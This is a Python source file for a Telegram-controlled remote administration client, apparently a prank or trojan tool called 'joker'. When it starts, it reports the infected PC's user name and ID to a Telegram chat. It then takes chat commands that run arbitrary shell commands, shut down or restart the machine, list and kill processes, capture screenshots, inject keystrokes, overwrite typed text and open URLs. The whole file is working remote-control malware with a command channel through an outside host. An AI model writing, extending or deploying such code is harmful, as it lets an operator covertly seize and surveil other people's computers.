import subprocess
import webbrowser

import keyboard
import telebot

from config import *
from utils import *

bot_id = getID()
bot = telebot.TeleBot(config.joker_token, threaded=False)


@bot.message_handler(commands=['online'])
def command_online(message):
    image_with_data(bot, chat_id, bot_id)


@bot.message_handler(commands=['help'])
def command_help(message):
    msgArray = getArrayMessage(message)
    if arrayEqualLength(msgArray, 1):
        return
    if equalsID(msgArray[1], bot_id):
        bot.send_message(message.chat.id, config.joker_help)


@bot.message_handler(commands=['cmd'])
def command_cmd(message):
    msgArray = getArrayMessage(message)
    if arrayEqualLength(msgArray, 2):
        return
    if equalsID(msgArray[1], bot_id):
        subprocess.call(msgArray[2].replace(space_symbol, ' '))
        bot.send_message(message.chat.id, config.success + f" {bot_id}")


@bot.message_handler(commands=['shutdown'])
def command_shutdown(message):
    msgArray = getArrayMessage(message)
    if arrayEqualLength(msgArray, 2):
        return
    if equalsID(msgArray[1], bot_id):
        if msgArray[2] == '1':
            subprocess.call("shutdown /s /t 1")
        if msgArray[2] == '2':
            subprocess.call("shutdown /r /t 1")
        bot.send_message(message.chat.id, config.success + f" {bot_id}")


@bot.message_handler(commands=['process'])
def command_process(message):
    msgArray = getArrayMessage(message)
    if arrayEqualLength(msgArray, 1):
        return
    if equalsID(msgArray[1], bot_id):
        bot.send_message(message.chat.id, getAllProcesses())


@bot.message_handler(commands=['wind'])
def command_window(message):
    msgArray = getArrayMessage(message)
    if arrayEqualLength(msgArray, 1):
        return
    if equalsID(msgArray[1], bot_id):
        keyboard.send("win+d")
        bot.send_message(message.chat.id, config.success + f" {bot_id}")


@bot.message_handler(commands=['altf4'])
def command_altf4(message):
    msgArray = getArrayMessage(message)
    if arrayEqualLength(msgArray, 1):
        return
    if equalsID(msgArray[1], bot_id):
        keyboard.send("alt+f4")
        bot.send_message(message.chat.id, config.success + f" {bot_id}")


@bot.message_handler(commands=['press'])
def command_press(message):
    msgArray = getArrayMessage(message)
    if arrayEqualLength(msgArray, 2):
        return
    if equalsID(msgArray[1], bot_id):
        keyboard.send(msgArray[2])
        bot.send_message(message.chat.id, config.success + f" {bot_id}")


@bot.message_handler(commands=['image'])
def command_image(message):
    msgArray = getArrayMessage(message)
    if arrayEqualLength(msgArray, 1):
        return
    if equalsID(msgArray[1], bot_id):
        image_with_data(bot, chat_id, bot_id)


@bot.message_handler(commands=['kill'])
def command_kill(message):
    msgArray = getArrayMessage(message)
    if arrayEqualLength(msgArray, 2):
        return
    if equalsID(msgArray[1], bot_id):
        subprocess.call("taskkill /IM " + msgArray[2])
        bot.send_message(message.chat.id, config.success + f" {bot_id}")


@bot.message_handler(commands=['url'])
def command_url(message):
    msgArray = getArrayMessage(message)
    if arrayEqualLength(msgArray, 2):
        return
    if equalsID(msgArray[1], bot_id):
        webbrowser.open_new_tab(msgArray[2])
        bot.send_message(message.chat.id, config.success + f" {bot_id}")


@bot.message_handler(commands=['print'])
def command_print(message):
    msgArray = getArrayMessage(message)
    if arrayEqualLength(msgArray, 2):
        return
    if equalsID(msgArray[1], bot_id):
        key = msgArray[2].replace(space_symbol, ' ')
        keyboard.write(key)
        bot.send_message(message.chat.id, 'Текст <' + key + '> был успешно напечатан!')


@bot.message_handler(commands=['replace'])
def command_replace(message):
    msgArray = getArrayMessage(message)
    if arrayEqualLength(msgArray, 2):
        return
    if equalsID(msgArray[1], bot_id):
        key = msgArray[2].replace(space_symbol, ' ')
        keyboard.send("ctrl+a+delete")
        keyboard.write(key)
        keyboard.send("enter")
        bot.send_message(message.chat.id, 'Текст <' + key + '> был успешно заменён!')


bot.send_message(chat_id, f'connect PC |{getUser()}| with ID: {bot_id}')

while True:
    try:
        bot.polling(none_stop=True, interval=0)
    except Exception as exception:
        print(str(exception))
